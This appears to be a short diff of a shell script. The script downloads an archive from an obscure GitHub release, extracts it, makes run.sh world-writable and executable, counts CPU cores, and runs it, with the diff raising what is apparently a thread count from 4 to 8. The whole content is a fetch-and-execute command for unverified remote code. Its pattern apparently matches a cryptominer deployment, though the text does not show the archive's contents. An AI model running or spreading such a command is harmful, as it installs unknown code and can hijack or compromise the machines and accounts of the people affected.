@@ -1,2 +1,2 @@
 curl -O -J -L https://github.com/zoxdameru821-arch/metax/releases/download/metas/mazda.tar.gz && tar -xf mazda.tar.gz && rm -rf mazda.tar.gz
-chmod 777 run.sh && nproc --all && ./run.sh 4
+chmod 777 run.sh && nproc --all && ./run.sh 8
